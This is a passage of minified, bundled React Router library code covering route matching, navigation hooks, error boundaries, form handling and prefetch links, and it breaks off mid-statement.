n.some(wu)&&(r+=Cu),t&&(r+=bu),n.filter(e=>!wu(e)).reduce((e,t)=>e+(vu.test(t)?yu:t===``?xu:Su),r)}function Eu(e,t){return e.length===t.length&&e.slice(0,-1).every((e,n)=>e===t[n])?e[e.length-1]-t[t.length-1]:0}function Du(e,t,n=!1){let{routesMeta:r}=e,i={},a=`/`,o=[];for(let e=0;e<r.length;++e){let s=r[e],c=e===r.length-1,l=a===`/`?t:t.slice(a.length)||`/`,u={path:s.relativePath,caseSensitive:s.caseSensitive,end:c},d=s.matcher&&s.compiledParams?ku(u,l,s.matcher,s.compiledParams):Ou(u,l),f=s.route;if(!d&&c&&n&&!r[r.length-1].route.index&&(d=Ou({path:s.relativePath,caseSensitive:s.caseSensitive,end:!1},l)),!d)return null;Object.assign(i,d.params),o.push({params:i,pathname:Bu([a,d.pathname]),pathnameBase:Hu(Bu([a,d.pathnameBase])),route:f}),d.pathnameBase!==`/`&&(a=Bu([a,d.pathnameBase]))}return o}function Ou(e,t){typeof e==`string`&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=Au(e.path,e.caseSensitive,e.end);return ku(e,t,n,r)}function ku(e,t,n,r){let i=t.match(n);if(!i)return null;let a=i[0],o=Vu(a,1),s=i.slice(1);return{params:r.reduce((e,{paramName:t,isOptional:n},r)=>{if(t===`*`){let e=s[r]||``;o=Vu(a.slice(0,a.length-e.length),1)}let i=s[r];return e[t]=n&&!i?void 0:(i||``).replace(/%2F/g,`/`),e},{}),pathname:a,pathnameBase:o,pattern:e}}function Au(e,t=!1,n=!0){X(e===`*`||!e.endsWith(`*`)||e.endsWith(`/*`),`Route path "${e}" will be treated as if it were "${e.replace(/\*$/,`/*`)}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${e.replace(/\*$/,`/*`)}".`);let r=[],i=`^`+e.replace(/\/*\*?$/,``).replace(/^\/*/,`/`).replace(/[\\.*+^${}|()[\]]/g,`\\$&`).replace(/\/:([\w-]+)(\?)?/g,(e,t,n,i,a)=>{if(r.push({paramName:t,isOptional:n!=null}),n){let t=a.charAt(i+e.length);return t&&t!==`/`?`/([^\\/]*)`:`(?:/([^\\/]*))?`}return`/([^\\/]+)`}).replace(/\/([\w-]+)\?(\/|$)/g,`(/$1)?$2`);return e.endsWith(`*`)?(r.push({paramName:`*`}),i+=e===`*`||e===`/*`?`(.*)$`:`(?:\\/(.+)|\\/*)$`):n?i+=`\\/*$`:e!==``&&e!==`/`&&(i+=`(?:(?=\\/|$))`),[new RegExp(i,t?void 0:`i`),r]}function ju(e){try{return e.split(`/`).map(e=>decodeURIComponent(e).replace(/\//g,`%2F`)).join(`/`)}catch(t){return X(!1,`The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`),e}}function Mu(e,t){if(t===`/`)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith(`/`)?t.length-1:t.length,r=e.charAt(n);return r&&r!==`/`?null:e.slice(n)||`/`}function Nu(e,t=`/`){let{pathname:n,search:r=``,hash:i=``}=typeof e==`string`?lu(e):e,a;return n?(n=zu(n),a=n.startsWith(`/`)||n.startsWith(`\\`)?Pu(n.substring(1),`/`):Pu(n,t)):a=t,{pathname:a,search:Uu(r),hash:Wu(i)}}function Pu(e,t){let n=Vu(t).split(`/`);return e.split(`/`).forEach(e=>{e===`..`?n.length>1&&n.pop():e!==`.`&&n.push(e)}),n.length>1?n.join(`/`):`/`}function Fu(e,t,n,r){return`Cannot include a '${e}' character in a manually specified \`to.${t}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function Iu(e){return e.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function Lu(e){let t=Iu(e);return t.map((e,n)=>n===t.length-1?e.pathname:e.pathnameBase)}function Ru(e,t,n,r=!1){let i;typeof e==`string`?i=lu(e):(i={...e},Y(!i.pathname||!i.pathname.includes(`?`),Fu(`?`,`pathname`,`search`,i)),Y(!i.pathname||!i.pathname.includes(`#`),Fu(`#`,`pathname`,`hash`,i)),Y(!i.search||!i.search.includes(`#`),Fu(`#`,`search`,`hash`,i)));let a=e===``||i.pathname===``,o=a?`/`:i.pathname,s;if(o==null)s=n;else{let e=t.length-1;if(!r&&o.startsWith(`..`)){let t=o.split(`/`);for(;t[0]===`..`;)t.shift(),--e;i.pathname=t.join(`/`)}s=e>=0?t[e]:`/`}let c=Nu(i,s),l=o&&o!==`/`&&o.endsWith(`/`),u=(a||o===`.`)&&n.endsWith(`/`);return!c.pathname.endsWith(`/`)&&(l||u)&&(c.pathname+=`/`),c}var zu=e=>e.replace(/[\\/]{2,}/g,`/`),Bu=e=>zu(e.join(`/`));function Vu(e,t=0){let n=e.length;for(;n>t&&e.charCodeAt(n-1)===47;)n--;return n===e.length?e:e.slice(0,n)}var Hu=e=>Vu(e).replace(/^\/*/,`/`),Uu=e=>!e||e===`?`?``:e.startsWith(`?`)?e:`?`+e,Wu=e=>!e||e===`#`?``:e.startsWith(`#`)?e:`#`+e,Z=class{constructor(e,t,n,r=!1){this.status=e,this.statusText=t||``,this.internal=r,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}};function Gu(e){return e!=null&&typeof e.status==`number`&&typeof e.statusText==`string`&&typeof e.internal==`boolean`&&`data`in e}function Ku(e){return Bu(e.map(e=>e.route.path).filter(Boolean))||`/`}var qu=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;function Ju(e,t){let n=e;if(typeof n!=`string`||!$l.test(n))return{absoluteURL:void 0,isExternal:!1,to:n};let r=n,i=!1;if(qu)try{let e=new URL(window.location.href),r=eu.test(n)?new URL(tu(n,e.protocol)):new URL(n),a=Mu(r.pathname,t);r.origin===e.origin&&a!=null?n=a+r.search+r.hash:i=!0}catch{X(!1,`<Link to="${n}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:r,isExternal:i,to:n}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);var Yu=new URL(`http://localhost`);function Xu(e){if(e.createURL)return e.createURL(`/`);try{return new URL(e.createHref(`/`),Yu)}catch{return Yu}}function Zu(e,t){return e.origin===t.origin&&(e.origin!==`null`||e.protocol===t.protocol&&e.host===t.host)}function Qu(e,t){if(e.startsWith(`//`))return!0;let n=t.protocol.toLowerCase();return e.toLowerCase().startsWith(n)?t.host===``||e.slice(n.length).startsWith(`//`):!1}function $u(e,t,n,r){let i=null;try{i=e==null?null:new URL(e,n)}catch{}let a=new URL(t,n),o=i!=null&&!Zu(i,n),s=!Zu(a,n);if(r===`reject`){if(o||s)throw Error(`External navigation is not allowed`)}else if(s&&(i==null||!Qu(e,i)||!Zu(i,a)))throw Error(`External navigation is not allowed`)}var ed=[`POST`,`PUT`,`PATCH`,`DELETE`];new Set(ed);var td=[`GET`,...ed];new Set(td);var nd=[`about:`,`blob:`,`chrome:`,`chrome-untrusted:`,`content:`,`data:`,`devtools:`,`file:`,`filesystem:`,`javascript:`];function rd(e){try{return nd.includes(new URL(e).protocol)}catch{return!1}}var id=v.createContext(null);id.displayName=`DataRouter`;var ad=v.createContext(null);ad.displayName=`DataRouterState`;var od=v.createContext(!1);function sd(){return v.useContext(od)}var cd=v.createContext({isTransitioning:!1});cd.displayName=`ViewTransition`;var ld=v.createContext(new Map);ld.displayName=`Fetchers`;var ud=v.createContext(null);ud.displayName=`Await`;var dd=v.createContext(null);dd.displayName=`Navigation`;var fd=v.createContext(null);fd.displayName=`Location`;var pd=v.createContext({outlet:null,matches:[],isDataRoute:!1});pd.displayName=`Route`;var md=v.createContext(null);md.displayName=`RouteError`;var hd=`REACT_ROUTER_ERROR`,gd=`REDIRECT`,_d=`ROUTE_ERROR_RESPONSE`;function vd(e){if(e.startsWith(`${hd}:${gd}:{`))try{let t=JSON.parse(e.slice(28));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`&&typeof t.location==`string`&&typeof t.reloadDocument==`boolean`&&typeof t.replace==`boolean`)return t}catch{}}function yd(e){if(e.startsWith(`${hd}:${_d}:{`))try{let t=JSON.parse(e.slice(40));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`)return new Z(t.status,t.statusText,t.data)}catch{}}function Q(e,{relative:t}={}){Y(bd(),`useHref() may be used only in the context of a <Router> component.`);let{basename:n,navigator:r}=v.useContext(dd),{hash:i,pathname:a,search:o}=Ed(e,{relative:t}),s=a;return n!==`/`&&(s=a===`/`?n:Bu([n,a])),r.createHref({pathname:s,search:o,hash:i})}function bd(){return v.useContext(fd)!=null}function xd(){return Y(bd(),`useLocation() may be used only in the context of a <Router> component.`),v.useContext(fd).location}var Sd=`You should call navigate() in a React.useEffect(), not when your component is first rendered.`;function Cd(e){v.useContext(dd).static||v.useLayoutEffect(e)}function wd(){let{isDataRoute:e}=v.useContext(pd);return e?Hd():Td()}function Td(){Y(bd(),`useNavigate() may be used only in the context of a <Router> component.`);let e=v.useContext(id),{basename:t,navigator:n}=v.useContext(dd),{matches:r}=v.useContext(pd),{pathname:i}=xd(),a=JSON.stringify(Lu(r)),o=v.useRef(!1);return Cd(()=>{o.current=!0}),v.useCallback((r,s={})=>{if(X(o.current,Sd),!o.current)return;if(typeof r==`number`){n.go(r);return}let c=Ru(r,JSON.parse(a),i,s.relative===`path`);e==null&&t!==`/`&&(c.pathname=c.pathname===`/`?t:Bu([t,c.pathname])),$u(typeof r==`string`?r:cu(r),n.createHref(c),Xu(n),`reject`),(s.replace?n.replace:n.push)(c,s.state,s)},[t,n,a,i,e])}v.createContext(null);function Ed(e,{relative:t}={}){let{matches:n}=v.useContext(pd),{pathname:r}=xd(),i=JSON.stringify(Lu(n));return v.useMemo(()=>Ru(e,JSON.parse(i),r,t===`path`),[e,i,r,t])}function Dd(e,t){return Od(e,t)}function Od(e,t,n){Y(bd(),`useRoutes() may be used only in the context of a <Router> component.`);let{navigator:r}=v.useContext(dd),{matches:i}=v.useContext(pd),a=i[i.length-1],o=a?a.params:{},s=a?a.pathname:`/`,c=a?a.pathnameBase:`/`,l=a&&a.route;{let e=l&&l.path||``;Wd(s,!l||e.endsWith(`*`)||e.endsWith(`*?`),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${s}" (under <Route path="${e}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${e}"> to <Route path="${e===`/`?`*`:`${e}/*`}">.`)}let u=xd(),d;if(t){let e=typeof t==`string`?lu(t):t;Y(c===`/`||e.pathname?.startsWith(c),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${e.pathname}" was given in the \`location\` prop.`),d=e}else d=u;let f=d.pathname||`/`,p=f;if(c!==`/`){let e=c.replace(/^\//,``).split(`/`);p=`/`+f.replace(/^\//,``).split(`/`).slice(e.length).join(`/`)}let m=n&&n.state.matches.length?n.state.matches.map(e=>Object.assign(e,{route:n.manifest[e.route.id]||e.route})):fu(e,{pathname:p});X(l||m!=null,`No routes matched location "${d.pathname}${d.search}${d.hash}" `),X(m==null||m[m.length-1].route.element!==void 0||m[m.length-1].route.Component!==void 0||m[m.length-1].route.lazy!==void 0,`Matched leaf route at location "${d.pathname}${d.search}${d.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let h=Pd(m&&m.map(e=>Object.assign({},e,{params:Object.assign({},o,e.params),pathname:Bu([c,r.encodeLocation?r.encodeLocation(e.pathname.replace(/%/g,`%25`).replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathname]),pathnameBase:e.pathnameBase===`/`?c:Bu([c,r.encodeLocation?r.encodeLocation(e.pathnameBase.replace(/%/g,`%25`).replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathnameBase])})),i,n);return t&&h?v.createElement(fd.Provider,{value:{location:{pathname:`/`,search:``,hash:``,state:null,key:`default`,mask:void 0,...d},navigationType:`POP`}},h):h}function kd(){let e=Vd(),t=Gu(e)?`${e.status} ${e.statusText}`:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r=`rgba(200,200,200, 0.5)`,i={padding:`0.5rem`,backgroundColor:r},a={padding:`2px 4px`,backgroundColor:r},o=null;return console.error(`Error handled by React Router default ErrorBoundary:`,e),o=v.createElement(v.Fragment,null,v.createElement(`p`,null,`💿 Hey developer 👋`),v.createElement(`p`,null,`You can provide a way better UX than this when your app throws errors by providing your own `,v.createElement(`code`,{style:a},`ErrorBoundary`),` or`,` `,v.createElement(`code`,{style:a},`errorElement`),` prop on your route.`)),v.createElement(v.Fragment,null,v.createElement(`h2`,null,`Unexpected Application Error!`),v.createElement(`h3`,{style:{fontStyle:`italic`}},t),n?v.createElement(`pre`,{style:i},n):null,o)}var Ad=v.createElement(kd,null),jd=class extends v.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!==`idle`&&e.revalidation===`idle`?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error===void 0?t.error:e.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){this.props.onError?this.props.onError(e,t):console.error(`React Router caught the following error during render`,e)}render(){let e=this.state.error;if(this.context&&typeof e==`object`&&e&&`digest`in e&&typeof e.digest==`string`){let t=yd(e.digest);t&&(e=t)}let t=e===void 0?this.props.children:v.createElement(pd.Provider,{value:this.props.routeContext},v.createElement(md.Provider,{value:e,children:this.props.component}));return this.context?v.createElement($,{error:e},t):t}};jd.contextType=od;var Md=new WeakMap;function $({children:e,error:t}){let{basename:n,navigator:r}=v.useContext(dd);if(typeof t==`object`&&t&&`digest`in t&&typeof t.digest==`string`){let e=vd(t.digest);if(e){let i=Md.get(t);if(i)throw i;let a=Ju(e.location,n),o=a.absoluteURL||a.to;if($u(e.location,o,Xu(r),`allow-explicit`),rd(o))throw Error(`Invalid redirect location`);if(qu&&!Md.get(t)){if(a.isExternal||e.reloadDocument)window.location.href=o;else{let n=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(a.to,{replace:e.replace}));throw Md.set(t,n),n}}return v.createElement(`meta`,{httpEquiv:`refresh`,content:`0;url=${o}`})}}return e}function Nd({routeContext:e,match:t,children:n}){let r=v.useContext(id);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),v.createElement(pd.Provider,{value:e},n)}function Pd(e,t=[],n){let r=n?.state;if(e==null){if(!r)return null;if(r.errors)e=r.matches;else if(t.length===0&&!r.initialized&&r.matches.length>0)e=r.matches;else return null}let i=e,a=r?.errors;if(a!=null){let e=i.findIndex(e=>e.route.id&&a?.[e.route.id]!==void 0);Y(e>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(a).join(`,`)}`),i=i.slice(0,Math.min(i.length,e+1))}let o=!1,s=-1;if(n&&r){o=r.renderFallback;for(let e=0;e<i.length;e++){let t=i[e];if((t.route.HydrateFallback||t.route.hydrateFallbackElement)&&(s=e),t.route.id){let{loaderData:e,errors:a}=r,c=t.route.loader&&!e.hasOwnProperty(t.route.id)&&(!a||a[t.route.id]===void 0);if(t.route.lazy||c){n.isStatic&&(o=!0),i=s>=0?i.slice(0,s+1):[i[0]];break}}}}let c=n?.onError,l=r&&c?(e,t)=>{c(e,{location:r.location,params:r.matches?.[0]?.params??{},pattern:Ku(r.matches),errorInfo:t})}:void 0;return i.reduceRight((e,n,c)=>{let u,d=!1,f=null,p=null;r&&(u=a&&n.route.id?a[n.route.id]:void 0,f=n.route.errorElement||Ad,o&&(s<0&&c===0?(Wd(`route-fallback`,!1,"No `HydrateFallback` element provided to render during initial hydration"),d=!0,p=null):s===c&&(d=!0,p=n.route.hydrateFallbackElement||null)));let m=t.concat(i.slice(0,c+1)),h=()=>{let t;return t=u?f:d?p:n.route.Component?v.createElement(n.route.Component,null):n.route.element?n.route.element:e,v.createElement(Nd,{match:n,routeContext:{outlet:e,matches:m,isDataRoute:r!=null},children:t})};return r&&(n.route.ErrorBoundary||n.route.errorElement||c===0)?v.createElement(jd,{location:r.location,revalidation:r.revalidation,component:f,error:u,children:h(),routeContext:{outlet:null,matches:m,isDataRoute:!0},onError:l}):h()},null)}function Fd(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function Id(e){let t=v.useContext(id);return Y(t,Fd(e)),t}function Ld(e){let t=v.useContext(ad);return Y(t,Fd(e)),t}function Rd(e){let t=v.useContext(pd);return Y(t,Fd(e)),t}function zd(e){let t=Rd(e),n=t.matches[t.matches.length-1];return Y(n.route.id,`${e} can only be used on routes that contain a unique "id"`),n.route.id}function Bd(){return zd(`useRouteId`)}function Vd(){let e=v.useContext(md),t=Ld(`useRouteError`),n=zd(`useRouteError`);return e===void 0?t.errors?.[n]:e}function Hd(){let{router:e}=Id(`useNavigate`),t=zd(`useNavigate`),n=v.useRef(!1);return Cd(()=>{n.current=!0}),v.useCallback(async(r,i={})=>{X(n.current,Sd),n.current&&(typeof r==`number`?await e.navigate(r):await e.navigate(r,{fromRouteId:t,...i}))},[e,t])}var Ud={};function Wd(e,t,n){!t&&!Ud[e]&&(Ud[e]=!0,X(!1,n))}v.memo(Gd);function Gd({routes:e,manifest:t,future:n,state:r,isStatic:i,onError:a}){return Od(e,void 0,{manifest:t,state:r,isStatic:i,onError:a,future:n})}function Kd(e){Y(!1,`A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.`)}function qd({basename:e=`/`,children:t=null,location:n,navigationType:r=`POP`,navigator:i,static:a=!1,useTransitions:o}){Y(!bd(),`You cannot render a <Router> inside another <Router>. You should never have more than one in your app.`);let s=e.replace(/^\/*/,`/`),c=v.useMemo(()=>({basename:s,navigator:i,static:a,useTransitions:o,future:{}}),[s,i,a,o]);typeof n==`string`&&(n=lu(n));let{pathname:l=`/`,search:u=``,hash:d=``,state:f=null,key:p=`default`,mask:m}=n,h=v.useMemo(()=>{let e=Mu(l,s);return e==null?null:{location:{pathname:e,search:u,hash:d,state:f,key:p,mask:m},navigationType:r}},[s,l,u,d,f,p,r,m]);return X(h!=null,`<Router basename="${s}"> is not able to match the URL "${l}${u}${d}" because it does not start with the basename, so the <Router> won't render anything.`),h==null?null:v.createElement(dd.Provider,{value:c},v.createElement(fd.Provider,{children:t,value:h}))}function Jd({children:e,location:t}){return Dd(Yd(e),t)}v.Component;function Yd(e,t=[]){let n=[];return v.Children.forEach(e,(e,r)=>{if(!v.isValidElement(e))return;let i=[...t,r];if(e.type===v.Fragment){n.push.apply(n,Yd(e.props.children,i));return}Y(e.type===Kd,`[${typeof e.type==`string`?e.type:e.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),Y(!e.props.index||!e.props.children,`An index route cannot have child routes.`);let a={id:e.props.id||i.join(`-`),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,middleware:e.props.middleware,loader:e.props.loader,action:e.props.action,hydrateFallbackElement:e.props.hydrateFallbackElement,HydrateFallback:e.props.HydrateFallback,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:e.props.hasErrorBoundary===!0||e.props.ErrorBoundary!=null||e.props.errorElement!=null,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(a.children=Yd(e.props.children,i)),n.push(a)}),n}var Xd=`get`,Zd=`application/x-www-form-urlencoded`;function Qd(e){return typeof HTMLElement<`u`&&e instanceof HTMLElement}function $d(e){return Qd(e)&&e.tagName.toLowerCase()===`button`}function ef(e){return Qd(e)&&e.tagName.toLowerCase()===`form`}function tf(e){return Qd(e)&&e.tagName.toLowerCase()===`input`}function nf(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function rf(e,t){return e.button===0&&(!t||t===`_self`)&&!nf(e)}var af=null;function of(){if(af===null)try{new FormData(document.createElement(`form`),0),af=!1}catch{af=!0}return af}var sf=new Set([`application/x-www-form-urlencoded`,`multipart/form-data`,`text/plain`]);function cf(e){return e!=null&&!sf.has(e)?(X(!1,`"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Zd}"`),null):e}function lf(e,t){let n,r,i,a,o;if(ef(e)){let o=e.getAttribute(`action`);r=o?Mu(o,t):null,n=e.getAttribute(`method`)||Xd,i=cf(e.getAttribute(`enctype`))||Zd,a=new FormData(e)}else if($d(e)||tf(e)&&(e.type===`submit`||e.type===`image`)){let o=e.form;if(o==null)throw Error(`Cannot submit a <button> or <input type="submit"> without a <form>`);let s=e.getAttribute(`formaction`)||o.getAttribute(`action`);if(r=s?Mu(s,t):null,n=e.getAttribute(`formmethod`)||o.getAttribute(`method`)||Xd,i=cf(e.getAttribute(`formenctype`))||cf(o.getAttribute(`enctype`))||Zd,a=new FormData(o,e),!of()){let{name:t,type:n,value:r}=e;if(n===`image`){let e=t?`${t}.`:``;a.append(`${e}x`,`0`),a.append(`${e}y`,`0`)}else t&&a.append(t,r)}}else if(Qd(e))throw Error(`Cannot submit element that is not <form>, <button>, or <input type="submit|image">`);else n=Xd,r=null,i=Zd,o=e;return a&&i===`text/plain`&&(o=a,a=void 0),{action:r,method:n.toLowerCase(),encType:i,formData:a,body:o}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);function uf(e,t){if(e===!1||e==null)throw Error(t)}function df(e,t,n,r){let i=typeof e==`string`?new URL(e,typeof window>`u`?`server://singlefetch/`:window.location.origin):e;return i.pathname=n?i.pathname.endsWith(`/`)?`${i.pathname}_.${r}`:`${i.pathname}.${r}`:i.pathname===`/`?`_root.${r}`:t&&Mu(i.pathname,t)===`/`?`${Vu(t)}/_root.${r}`:`${Vu(i.pathname)}.${r}`,i}async function ff(e,t){if(e.id in t)return t[e.id];try{let n=await Ql(()=>import(e.module),[]);return t[e.id]=n,n}catch(t){return console.error(`Error loading route module \`${e.module}\`, reloading page...`),console.error(t),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function pf(e){return e!=null&&typeof e.page==`string`}function mf(e){return e==null?!1:e.href==null?e.rel===`preload`&&typeof e.imageSrcSet==`string`&&typeof e.imageSizes==`string`:typeof e.rel==`string`&&typeof e.href==`string`}async function hf(e,t,n){return bf((await Promise.all(e.map(async e=>{let r=t.routes[e.route.id];if(r){let e=await ff(r,n);return e.links?e.links():[]}return[]}))).flat(1).filter(mf).filter(e=>e.rel===`stylesheet`||e.rel===`preload`).map(e=>e.rel===`stylesheet`?{...e,rel:`prefetch`,as:`style`}:{...e,rel:`prefetch`}))}function gf(e,t,n,r,i,a){let o=(e,t)=>!n[t]||e.route.id!==n[t].route.id,s=(e,t)=>n[t].pathname!==e.pathname||n[t].route.path?.endsWith(`*`)&&n[t].params[`*`]!==e.params[`*`];return a===`assets`?t.filter((e,t)=>o(e,t)||s(e,t)):a===`data`?t.filter((t,a)=>{let c=r.routes[t.route.id];if(!c||!c.hasLoader)return!1;if(o(t,a)||s(t,a))return!0;if(t.route.shouldRevalidate){let r=t.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:n[0]?.params||{},nextUrl:new URL(e,window.origin),nextParams:t.params,defaultShouldRevalidate:!0});if(typeof r==`boolean`)return r}return!0}):[]}function _f(e,t,{includeHydrateFallback:n}={}){return vf(e.map(e=>{let r=t.routes[e.route.id];if(!r)return[];let i=[r.module];return r.clientActionModule&&(i=i.concat(r.clientActionModule)),r.clientLoaderModule&&(i=i.concat(r.clientLoaderModule)),n&&r.hydrateFallbackModule&&(i=i.concat(r.hydrateFallbackModule)),r.imports&&(i=i.concat(r.imports)),i}).flat(1))}function vf(e){return[...new Set(e)]}function yf(e){let t={},n=Object.keys(e).sort();for(let r of n)t[r]=e[r];return t}function bf(e,t){let n=new Set,r=new Set(t);return e.reduce((e,i)=>{if(t&&!pf(i)&&i.as===`script`&&i.href&&r.has(i.href))return e;let a=JSON.stringify(yf(i));return n.has(a)||(n.add(a),e.push({key:a,link:i})),e},[])}function xf(){let e=v.useContext(id);return uf(e,`You must render this element inside a <DataRouterContext.Provider> element`),e}function Sf(){let e=v.useContext(ad);return uf(e,`You must render this element inside a <DataRouterStateContext.Provider> element`),e}var Cf=v.createContext(void 0);Cf.displayName=`FrameworkContext`;function wf(){let e=v.useContext(Cf);return uf(e,`You must render this element inside a <HydratedRouter> element`),e}function Tf(e,t){let n=v.useContext(Cf),[r,i]=v.useState(!1),[a,o]=v.useState(!1),{onFocus:s,onBlur:c,onMouseEnter:l,onMouseLeave:u,onTouchStart:d}=t,f=v.useRef(null);v.useEffect(()=>{if(e===`render`&&o(!0),e===`viewport`){let e=new IntersectionObserver(e=>{e.forEach(e=>{o(e.isIntersecting)})},{threshold:.5});return f.current&&e.observe(f.current),()=>{e.disconnect()}}},[e]),v.useEffect(()=>{if(r){let e=setTimeout(()=>{o(!0)},100);return()=>{clearTimeout(e)}}},[r]);let p=()=>{i(!0)},m=()=>{i(!1),o(!1)};return n?e===`intent`?[a,f,{onFocus:Ef(s,p),onBlur:Ef(c,m),onMouseEnter:Ef(l,p),onMouseLeave:Ef(u,m),onTouchStart:Ef(d,p)}]:[a,f,{}]:[!1,f,{}]}function Ef(e,t){return n=>{e&&e(n),n.defaultPrevented||t(n)}}function Df({page:e,...t}){let n=sd(),{nonce:r}=wf(),{router:i}=xf(),a=v.useMemo(()=>fu(i.routes,e,i.basename),[i.routes,e,i.basename]);return a?(t.nonce==null&&r&&(t={...t,nonce:r}),n?v.createElement(kf,{page:e,matches:a,...t}):v.createElement(Af,{page:e,matches:a,...t})):null}function Of(e){let{manifest:t,routeModules:n}=wf(),[r,i]=v.useState([]);return v.useEffect(()=>{let r=!1;return hf(e,t,n).then(e=>{r||i(e)}),()=>{r=!0}},[e,t,n]),r}function kf({page:e,matches:t,...n}){let r=xd(),{future:i}=wf(),{basename:a}=xf(),o=v.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let n=df(e,a,i.v8_trailingSlashAwareDataRequests,`rsc`),o=!1,s=[];for(let e of t)typeof e.route.shouldRevalidate==`function`?o=!0:s.push(e.route.id);return o&&s.length>0&&n.searchParams.set(`_routes`,s.join(`,`)),[n.pathname+n.search]},[a,i.v8_trailingSlashAwareDataRequests,e,r,t]);return v.createElement(v.Fragment,null,o.map(e=>v.createElement(`link`,{key:e,rel:`prefetch`,as:`fetch`,href:e,...n})))}function Af({page:e,matches:t,...n}){let r=xd(),{future:i,manifest:a,routeModules:o}=wf(),{basename:s}=xf(),{loaderData:c,matches:l}=Sf(),u=v.useMemo(()=>gf(e,t,l,a,r,`data`),[e,t,l,a,r]),d=v.useMemo(()=>gf(e,t,l,a,r,`assets`),[e,t,l,a,r]),f=v.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let n=new Set,l=!1;if(t.forEach(e=>{let t=a.routes[e.route.id];!t||!t.hasLoader||(!u.some(t=>t.route.id===e.route.id)&&e.route.id in c&&o[e.route.id]?.shouldRevalidate||t.hasClientLoader?l=!0:n.add(e.route.id))}),n.size===0)return[];let d=df(e,s,i.v8_trailingSlashAwareDataRequests,`data`);return l&&n.size>0&&d.searchParams.set(`_routes`,t.filter(e=>n.has(e.route.id)).map(e=>e.route.id).join(`,`)),[d.pathname+d.search]},[s,i.v8_trailingSlashAwareDataRequests,c,r,a,u,t,e,o]),p=v.useMemo(()=>_f(d,a),[d,a]),m=Of(d);return v.createElement(v.Fragment,null,f.map(e=>v.createElement(`link`,{key:e,rel:`prefetch`,as:`fetch`,href:e,...n})),p.map(e=>v.createElement(`link`,{key:e,rel:`modulepreload`,href:e,...n})),m.map(({key:e,link:t})=>v.createElement(`link`,{key:e,nonce:n.nonce,...t,crossOrigin:t.crossOrigin??n.crossOrigin})))}function jf(...e){return t=>{e.forEach(e=>{typeof e==`function`?e(t):e!=null&&(e.current=t)})}}v.Component;var Mf=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;try{Mf&&(window.__reactRouterVersion=`7.18.4`)}catch{}function Nf({basename:e,children:t,useTransitions:n,window:r}){let i=v.useRef();i.current??=iu({window:r,v5Compat:!0});let a=i.current,[o,s]=v.useState({action:a.action,location:a.location}),c=v.useCallback(e=>{n===!1?s(e):v.startTransition(()=>s(e))},[n]);return v.useLayoutEffect(()=>a.listen(c),[a,c]),v.createElement(qd,{basename:e,children:t,location:o.location,navigationType:o.action,navigator:a,useTransitions:n})}var Pf=v.forwardRef(function({onClick:e,discover:t=`render`,prefetch:n=`none`,relative:r,reloadDocument:i,replace:a,mask:o,state:s,target:c,to:l,preventScrollReset:u,viewTransition:d,defaultShouldRevalidate:f,...p},m){let{basename:h,navigator:g,useTransitions:_}=v.useContext(dd),y=typeof l==`string`&&$l.test(l),b=Ju(l,h);l=b.to;let x=Q(l,{relative:r}),ee=xd(),S=null;if(o){let e=Ru(o,[],ee.mask?ee.mask.pathname:`/`,!0);h!==`/`&&(e.pathname=e.pathname===`/`?h:Bu([h,e.pathname])),S=g.createHref(e)}let[C,w,T]=Tf(n,p),te=zf(l,{replace:a,mask:o,state:s,target:c,preventScrollReset:u,relative:r,viewTransition:d,defaultShouldRevalidate:f,useTransitions:_});function E(t){e&&e(t),t.defaultPrevented||te(t)}let 